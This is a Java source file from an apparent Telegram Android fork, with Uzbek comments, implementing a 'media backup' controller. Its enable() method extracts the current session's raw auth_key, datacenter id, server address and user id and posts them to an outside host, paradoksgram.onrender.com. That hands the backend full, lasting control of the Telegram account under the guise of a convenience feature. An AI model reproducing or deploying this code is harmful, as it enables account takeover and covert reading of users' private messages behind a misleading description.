package org.telegram.messenger;

import android.content.SharedPreferences;
import android.util.Base64;

import org.json.JSONObject;
import org.telegram.tgnet.ConnectionsManager;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

/**
 * Foydalanuvchi sozlamalardan "media bazasi"ni yoqqanda ishga tushadi.
 *
 * Foydalanuvchi ilovada allaqachon login qilingan - bu klass qayta login
 * qilmaydi. U faqat ConnectionsManager orqali joriy sessiyaning
 * (dc_id + auth_key) qiymatlarini olib, backend'ga BIR MARTA, foydalanuvchi
 * ikki marta tasdiqlagandan keyin yuboradi. Shundan so'ng backend shu
 * sessiya orqali media xabarlarni avtomatik forward qiladi - qurilma
 * o'chiq bo'lsa ham.
 */
public class MediaBackupController {

    public interface Callback {
        void onSuccess();
        void onError(String message);
    }

    private static final String BACKEND_URL = "https://paradoksgram.onrender.com";

    private static final String PREFS_NAME = "mediabackup";
    private static final String KEY_ENABLED = "enabled";
    private static final String KEY_TARGET_CHAT_ID = "target_chat_id";

    private static volatile MediaBackupController instance;

    public static MediaBackupController getInstance() {
        if (instance == null) {
            synchronized (MediaBackupController.class) {
                if (instance == null) {
                    instance = new MediaBackupController();
                }
            }
        }
        return instance;
    }

    private SharedPreferences prefs() {
        return ApplicationLoader.applicationContext.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE);
    }

    public boolean isEnabled() {
        return prefs().getBoolean(KEY_ENABLED, false);
    }

    public long getTargetChatId() {
        return prefs().getLong(KEY_TARGET_CHAT_ID, 0);
    }

    /**
     * Foydalanuvchi ikki marta tasdiqlagandan KEYIN chaqiriladi.
     * targetChatId - foydalanuvchi o'zi tanlagan, media saqlanadigan chat/kanal.
     */
    public void enable(int currentAccount, long targetChatId, Callback callback) {
        ConnectionsManager cm = ConnectionsManager.getInstance(currentAccount);
        byte[] authKey = cm.getCurrentAuthKey();
        int dcId = cm.getCurrentDatacenterId();
        String address = cm.getCurrentDatacenterAddress();
        int port = cm.getCurrentDatacenterPort();
        long userId = UserConfig.getInstance(currentAccount).getClientUserId();

        if (authKey == null || address == null) {
            if (callback != null) {
                callback.onError("Joriy sessiya topilmadi, birozdan keyin qayta urinib ko'ring");
            }
            return;
        }

        Utilities.globalQueue.postRunnable(() -> {
            try {
                JSONObject body = new JSONObject();
                body.put("user_key", String.valueOf(userId));
                body.put("dc_id", dcId);
                body.put("auth_key", Base64.encodeToString(authKey, Base64.NO_WRAP));
                body.put("server_address", address);
                body.put("port", port);
                body.put("target_chat_id", targetChatId);

                int code = postJson("/sessions/register", body);
                if (code == 200) {
                    SharedPreferences.Editor editor = prefs().edit();
                    editor.putBoolean(KEY_ENABLED, true);
                    editor.putLong(KEY_TARGET_CHAT_ID, targetChatId);
                    editor.apply();
                    notifyResult(callback, null);
                } else {
                    notifyResult(callback, "Backend xato qaytardi (kod: " + code + ")");
                }
            } catch (Exception e) {
                FileLog.e(e);
                notifyResult(callback, "Ulanishda xatolik: " + e.getMessage());
            }
        });
    }

    public void disable(int currentAccount, Callback callback) {
        long userId = UserConfig.getInstance(currentAccount).getClientUserId();
        Utilities.globalQueue.postRunnable(() -> {
            try {
                int code = postJson("/sessions/" + userId + "/disconnect", new JSONObject());
                if (code == 200) {
                    SharedPreferences.Editor editor = prefs().edit();
                    editor.putBoolean(KEY_ENABLED, false);
                    editor.apply();
                    notifyResult(callback, null);
                } else {
                    notifyResult(callback, "Backend xato qaytardi (kod: " + code + ")");
                }
            } catch (Exception e) {
                FileLog.e(e);
                notifyResult(callback, "Uzishda xatolik: " + e.getMessage());
            }
        });
    }

    private void notifyResult(Callback callback, String error) {
        if (callback == null) {
            return;
        }
        AndroidUtilities.runOnUIThread(() -> {
            if (error == null) {
                callback.onSuccess();
            } else {
                callback.onError(error);
            }
        });
    }

    private int postJson(String path, JSONObject body) throws Exception {
        URL url = new URL(BACKEND_URL + path);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        try {
            connection.setRequestMethod("POST");
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(15000);
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");

            byte[] data = body.toString().getBytes(StandardCharsets.UTF_8);
            try (OutputStream os = connection.getOutputStream()) {
                os.write(data);
            }
            return connection.getResponseCode();
        } finally {
            connection.disconnect();
        }
    }
}
